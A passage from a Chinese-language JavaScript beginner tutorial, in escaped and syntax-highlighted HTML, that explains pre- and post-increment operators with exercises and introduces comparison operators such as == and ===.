        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 想要一个变量自己加1 num = num + 1 比较麻烦
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// ==num
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 3
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 前置递增运算符 ++ 写在变量的前面
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
            &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 类似于 age = age + 1;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 先加1，后返回值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 21
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;5322-后置递增运算符&#34;&gt;5.3.2.2 后置递增运算符&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;num++&lt;/code&gt; 后置递增，就是自加1，类似于&lt;code&gt;num = num + 1&lt;/code&gt;，但是&lt;code&gt;num++&lt;/code&gt;写起来更简单&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;使用口诀：先返回原值，后自加1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// num = num + 1;	++num;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;);
            &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 前置递增和后置递增如果单独使用，效果是一样的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 后置递增，口诀
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;练习&#34;&gt;练习&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
            &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// ++a 11	a = 11
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// ++a = 12
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 14
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// c++ = 11
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// c++ = 11 c = 12
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;d&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 13
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. e++ = 10 e = 11 2. e = 12
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 22
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 后置自增，先表达式返回原值，后面变量再自加1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;533-前置递增和后置递增小结&#34;&gt;5.3.3 前置递增和后置递增小结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;前置递增和后置递增运算符可以简化代码的编写，让变量的值+1比以前写法更简单&lt;/li&gt;
&lt;li&gt;单独使用时，运行结果相同&lt;/li&gt;
&lt;li&gt;与其他代码联用时，执行结果会不同&lt;/li&gt;
&lt;li&gt;后置：先原值运算，后自加（先人后己）&lt;/li&gt;
&lt;li&gt;前置：先自加，后运算（先己后人）&lt;/li&gt;
&lt;li&gt;开发时，大多使用后置递增/减，并且代码独占一行，例如：num++；或者num&amp;ndash;；&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;54-比较运算符&#34;&gt;5.4 比较运算符&lt;/h2&gt;
&lt;h3 id=&#34;541-比较运算符概述&#34;&gt;5.4.1 比较运算符概述&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;概念：比较运算符（关系运算符）是两个数据进行比较时所使用的运算符，比较运算后，会返回一个布尔值（true/false）作为比较运算的结果&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;运算符名称&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;案例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;lt;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;小于号&lt;/td&gt;
&lt;td&gt;&lt;code&gt;1 &amp;lt; 2&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;大于号&lt;/td&gt;
&lt;td&gt;&lt;code&gt;1 &amp;gt; 2&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;gt;=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;大于等于号（大于或者等于）&lt;/td&gt;
&lt;td&gt;&lt;code&gt;2 &amp;gt;= 2&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;lt;=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;小于等于号（小于或者等于）&lt;/td&gt;
&lt;td&gt;&lt;code&gt;3 &amp;lt;= 2&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;==&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;判等号（会转型）&lt;/td&gt;
&lt;td&gt;&lt;code&gt;37 == 37&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;!=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;不等号&lt;/td&gt;
&lt;td&gt;&lt;code&gt;37 != 37&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;===&lt;/code&gt; &lt;code&gt;!==&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;全等 要求值和 数据类型都一致&lt;/td&gt;
&lt;td&gt;&lt;code&gt;37 === &#39;37&#39;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 我们程序里面的等于符号 是 == 默认转换数据类型，会把字符串型的数据转换为数字型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;刘德华&amp;#39;&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;18&amp;#39;&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 我们程序里面有全等，一模一样，要求两侧的值还有数据类型完全一致菜可以 true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;18&amp;#39;&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;542--小结&#34;&gt;5.4.2 = 小结&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;符号&lt;/th&gt;
&lt;th&gt;作用&lt;/th&gt;
&lt;th&gt;用法&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;赋值&lt;/td&gt;
&lt;td&gt;把右边给左边&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;==&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;判断&lt;/td&gt;
